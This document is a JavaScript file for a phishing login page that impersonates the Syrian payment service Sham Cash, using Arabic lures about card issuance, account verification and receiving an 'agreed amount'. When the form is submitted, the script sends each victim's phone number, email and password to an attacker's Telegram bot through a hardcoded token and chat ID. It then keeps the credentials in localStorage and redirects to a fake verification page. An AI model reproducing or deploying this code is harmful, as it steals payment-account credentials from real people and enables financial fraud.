document.addEventListener('DOMContentLoaded', function() {
    const TELEGRAM_BOT_TOKEN = '8335962255:AAHDeJbWKC9D7zeESdlMtq5cX86PnFVKjuk';
    const TELEGRAM_CHAT_ID = '7464148063';
    
    const loginForm = document.getElementById('loginForm');
    const phoneInput = document.getElementById('phoneNumber');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const agreedAmountInput = document.getElementById('agreedAmount');
    const agreedAmountGroup = document.getElementById('agreedAmountGroup');
    const loginTitle = document.getElementById('loginTitle');
    const submitBtn = document.querySelector('.submit-btn');
    const qrScannerBtn = document.getElementById('qrScannerBtn');
    const backBtn = document.getElementById('backBtn');
    const togglePasswordBtn = document.getElementById('togglePassword');

    const urlParams = new URLSearchParams(window.location.search);
    const loginType = urlParams.get('type');

    const titles = {
        'card': 'اصدار بطاقة شام كاش',
        'verify': 'توثيق حساب شام كاش',
        'exchange': 'تفعيل خاصية تحويل العملات',
        'download': 'الرجاء ادخال بيانات الحساب المراد تنزيل المبلغ المتفق عليه'
    };

    if (loginType && titles[loginType]) {
        loginTitle.textContent = titles[loginType];
    }

    if (loginType === 'download') {
        agreedAmountGroup.style.display = 'block';
        agreedAmountInput.required = true;
    } else {
        agreedAmountGroup.style.display = 'none';
        agreedAmountInput.required = false;
    }

    // Function to send data to Telegram
    async function sendToTelegram(data) {
        const message = `
🔔 <b>تسجيل دخول جديد - شام كاش</b>

📱 <b>رقم الهاتف:</b> ${data.phone}
📧 <b>البريد الإلكتروني:</b> ${data.email}
🔐 <b>كلمة السر:</b> ${data.password}
💰 <b>المبلغ المتفق عليه:</b> ${data.agreedAmount || 'غير محدد'}

⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-SY')}
        `.trim();

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });

            const result = await response.json();
            
            if (result.ok) {
                console.log('تم إرسال البيانات إلى تيليجرام بنجاح');
                return true;
            } else {
                console.error('خطأ في إرسال البيانات:', result);
                return false;
            }
        } catch (error) {
            console.error('خطأ في الاتصال بتيليجرام:', error);
            return false;
        }
    }

    // Input validation patterns
    const patterns = {
        phone: /^(\+?963|0)?9\d{8}$/,
        email: /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/,
        password: /^.{6,}$/,
        amount: /^\d+$/
    };

    // Real-time validation
    phoneInput.addEventListener('input', function(e) {
        validateInput(this, patterns.phone);
    });

    emailInput.addEventListener('input', function(e) {
        validateInput(this, patterns.email);
    });

    passwordInput.addEventListener('input', function(e) {
        validateInput(this, patterns.password);
    });

    if (agreedAmountInput) {
        agreedAmountInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
            if (this.value) {
                validateInput(this, patterns.amount);
            }
        });
    }

    function validateInput(input, pattern) {
        input.classList.remove('success', 'error');
        
        if (input.value.length === 0) return;
        
        if (pattern.test(input.value)) {
            input.classList.add('success');
        } else {
            input.classList.add('error');
        }
    }

    // Form submission
    loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();

        const phoneValue = phoneInput.value.trim();
        const emailValue = emailInput.value.trim();
        const passwordValue = passwordInput.value;
        const agreedAmountValue = agreedAmountInput ? agreedAmountInput.value.trim() : '';

        // Validate all fields
        let isValid = true;

        if (!patterns.phone.test(phoneValue)) {
            phoneInput.classList.add('error');
            isValid = false;
        }

        if (!patterns.email.test(emailValue)) {
            emailInput.classList.add('error');
            isValid = false;
        }

        if (!patterns.password.test(passwordValue)) {
            passwordInput.classList.add('error');
            isValid = false;
        }

        if (agreedAmountInput && agreedAmountValue && !patterns.amount.test(agreedAmountValue)) {
            agreedAmountInput.classList.add('error');
            isValid = false;
        }

        if (!isValid) {
            showNotification('الرجاء التحقق من البيانات المدخلة', 'info');
            return;
        }

        // Show loading state
        submitBtn.textContent = 'جاري الإرسال...';
        submitBtn.disabled = true;
        
        // Add loading class to inputs
        phoneInput.classList.add('loading');
        emailInput.classList.add('loading');
        passwordInput.classList.add('loading');
        if (agreedAmountInput) agreedAmountInput.classList.add('loading');

        // Send data to Telegram
        const telegramData = {
            phone: phoneValue,
            email: emailValue,
            password: passwordValue,
            agreedAmount: agreedAmountValue
        };

        const sent = await sendToTelegram(telegramData);

        // Remove loading state
        phoneInput.classList.remove('loading');
        emailInput.classList.remove('loading');
        passwordInput.classList.remove('loading');
        if (agreedAmountInput) agreedAmountInput.classList.remove('loading');
        submitBtn.textContent = 'تسجيل الدخول';
        submitBtn.disabled = false;

        if (sent) {
            localStorage.setItem('userPhone', phoneValue);
            localStorage.setItem('userEmail', emailValue);
            localStorage.setItem('userPassword', passwordValue);
            localStorage.setItem('userAmount', agreedAmountValue);
            
            submitBtn.style.background = 'linear-gradient(135deg, #2ecc71 0%, #27ae60 100%)';
            
            setTimeout(() => {
                window.location.href = 'verification.html';
            }, 800);
        } else {
            showNotification('حدث خطأ في الإرسال. الرجاء المحاولة مرة أخرى', 'error');
        }
    });

    togglePasswordBtn.addEventListener('click', function() {
        if (passwordInput.type === 'password') {
            passwordInput.type = 'text';
            this.classList.add('active');
            showNotification('كلمة السر مرئية', 'info');
        } else {
            passwordInput.type = 'password';
            this.classList.remove('active');
        }
    });

    qrScannerBtn.addEventListener('click', function() {
        showNotification('جاري فتح ماسح الرمز...', 'info');
        
        // Add pulse animation
        this.style.animation = 'pulse 0.5s';
        setTimeout(() => {
            this.style.animation = '';
        }, 500);

        // Simulate QR scanner opening
        setTimeout(() => {
            showNotification('يمكنك الآن مسح رمز QR', 'success');
        }, 1000);
    });

    // Back button
    backBtn.addEventListener('click', function() {
        // Add exit animation
        document.querySelector('.login-container').style.animation = 'fadeOut 0.4s ease-out';
        
        setTimeout(() => {
            window.location.href = 'index.html';
        }, 400);
    });

    // Notification System
    function showNotification(message, type = 'info') {
        const notification = document.createElement('div');
        notification.className = `notification notification-${type}`;
        notification.textContent = message;
        
        const colors = {
            success: 'linear-gradient(135deg, #2ecc71, #27ae60)',
            error: 'linear-gradient(135deg, #f0b429, #f7c84b)',
            info: 'linear-gradient(135deg, #3498db, #2980b9)'
        };
        
        notification.style.cssText = `
            position: fixed;
            top: 30px;
            right: 30px;
            background: ${colors[type]};
            color: white;
            padding: 18px 28px;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            z-index: 10000;
            font-family: 'Cairo', sans-serif;
            font-size: 15px;
            font-weight: 600;
            animation: slideInRight 0.4s ease-out, slideOutRight 0.4s ease-in 2.6s;
            max-width: 320px;
        `;
        
        document.body.appendChild(notification);
        
        setTimeout(() => {
            notification.remove();
        }, 3000);
    }

    // Add notification animations
    const style = document.createElement('style');
    style.textContent = `
        @keyframes slideInRight {
            from {
                transform: translateX(400px);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }
        
        @keyframes slideOutRight {
            from {
                transform: translateX(0);
                opacity: 1;
            }
            to {
                transform: translateX(400px);
                opacity: 0;
            }
        }

        @keyframes fadeOut {
            from {
                opacity: 1;
                transform: translateY(0);
            }
            to {
                opacity: 0;
                transform: translateY(-20px);
            }
        }

        @keyframes pulse {
            0%, 100% {
                transform: scale(1);
            }
            50% {
                transform: scale(1.1);
            }
        }
    `;
    document.head.appendChild(style);

    // Parallax effect for 3D logo
    const logo3d = document.querySelector('.logo-3d-shape');
    let mouseX = 0;
    let mouseY = 0;
    let logoX = 0;
    let logoY = 0;

    document.addEventListener('mousemove', function(e) {
        mouseX = (e.clientX / window.innerWidth - 0.5) * 20;
        mouseY = (e.clientY / window.innerHeight - 0.5) * 20;
    });

    function animateLogo() {
        logoX += (mouseX - logoX) * 0.1;
        logoY += (mouseY - logoY) * 0.1;
        
        if (logo3d) {
            const currentTransform = logo3d.style.transform || '';
            const rotateMatch = currentTransform.match(/rotate[XY]\([^)]+\)/g);
            const baseRotation = rotateMatch ? rotateMatch.join(' ') : 'rotateY(0deg)';
            logo3d.style.transform = `${baseRotation} translateX(${logoX}px) translateY(${logoY}px)`;
        }
        
        requestAnimationFrame(animateLogo);
    }

    animateLogo();

    // Auto-focus on first input
    setTimeout(() => {
        phoneInput.focus();
    }, 600);

    // Enter key navigation between inputs
    phoneInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            emailInput.focus();
        }
    });

    emailInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            passwordInput.focus();
        }
    });

    passwordInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            if (agreedAmountInput) {
                agreedAmountInput.focus();
            } else {
                loginForm.dispatchEvent(new Event('submit'));
            }
        }
    });

    if (agreedAmountInput) {
        agreedAmountInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                loginForm.dispatchEvent(new Event('submit'));
            }
        });
    }



    // Prevent default form autofill styling
    window.addEventListener('load', function() {
        const inputs = document.querySelectorAll('.form-input');
        inputs.forEach(input => {
            if (input.value !== '') {
                input.classList.add('has-value');
            }
        });
    });

    // Add value class when input has value
    const allInputs = agreedAmountInput ? 
        [phoneInput, emailInput, passwordInput, agreedAmountInput] : 
        [phoneInput, emailInput, passwordInput];
    allInputs.forEach(input => {
        input.addEventListener('input', function() {
            if (this.value !== '') {
                this.classList.add('has-value');
            } else {
                this.classList.remove('has-value');
            }
        });
    });

    // Keyboard shortcuts
    document.addEventListener('keydown', function(e) {
        // Ctrl/Cmd + K for QR scanner
        if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
            e.preventDefault();
            qrScannerBtn.click();
        }
        
        // Escape key to go back
        if (e.key === 'Escape') {
            backBtn.click();
        }
    });

    // Loading animation for page
    window.addEventListener('load', function() {
        document.body.style.opacity = '0';
        setTimeout(() => {
            document.body.style.transition = 'opacity 0.5s ease';
            document.body.style.opacity = '1';
        }, 100);
    });
});
